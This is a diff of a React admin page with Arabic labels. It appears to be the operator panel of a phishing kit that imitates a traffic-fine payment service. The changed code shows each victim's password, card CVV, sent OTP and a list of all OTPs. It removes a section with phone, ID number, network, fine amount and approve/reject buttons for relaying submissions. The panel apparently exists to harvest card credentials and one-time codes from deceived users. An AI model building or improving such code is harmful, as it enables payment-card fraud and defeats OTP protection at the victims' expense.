@@ -736,63 +736,24 @@ export default function NotificationsPage() {
                 {selectedNotification.pass}
               </p>
               <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
-                {selectedNotification?.otp2!}
+                <strong>رمز التحقق المرسل :</strong> {selectedNotification.otp}
               </p>
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز الامان :</strong>{' '}
                 {selectedNotification?.cvv!}
+              </p> 
+              <p className="flex items-center">
+                <strong className="text-red-400 mx-4">رمز  :</strong>{' '}
+              </p>
+              <p>
+              {selectedNotification&& selectedNotification?.allOtps!.map((i)=>
+              <Badge>{i}</Badge>
+              )}
+
               </p>
             </div>
           )}
-          {selectedInfo === 'personal' && selectedNotification && (
-            <div className="space-y-2">
-              <p>
-                <strong>الهاتف:</strong> {selectedNotification.mobile}
-              </p>
-              <p>
-                <strong>رقم الهوية</strong> {selectedNotification.idNumber}
-              </p>
-              <p>
-                <strong>نوع الشبكة :</strong> {selectedNotification.network}
-              </p>{' '}
-              <p>
-                <strong>قيمة المخالفة :</strong>{' '}
-                {selectedNotification.violationValue}
-              </p>{' '}
-              <p>
-                <strong>رمز التحقق المرسل :</strong> {selectedNotification.otp}
-              </p>
-              <div className="flex justify-between mx-1">
-                <Button
-                  onClick={() => {
-                    handleApproval('approved', selectedNotification.id);
-                    setMessage(true);
-                    setTimeout(() => {
-                      setMessage(false);
-                    }, 3000);
-                  }}
-                  className="w-full m-3 bg-green-500"
-                >
-                  قبول
-                </Button>
-                <Button
-                  onClick={() => {
-                    handleApproval('rejected', selectedNotification.id);
-                    setMessage(true);
-                    setTimeout(() => {
-                      setMessage(false);
-                    }, 3000);
-                  }}
-                  className="w-full m-3"
-                  variant="destructive"
-                >
-                  رفض
-                </Button>
-              </div>
-              <p className="text-red-500">{message ? 'تم الارسال' : ''}</p>
-            </div>
-          )}
+     
         </DialogContent>
       </Dialog>
     </div>
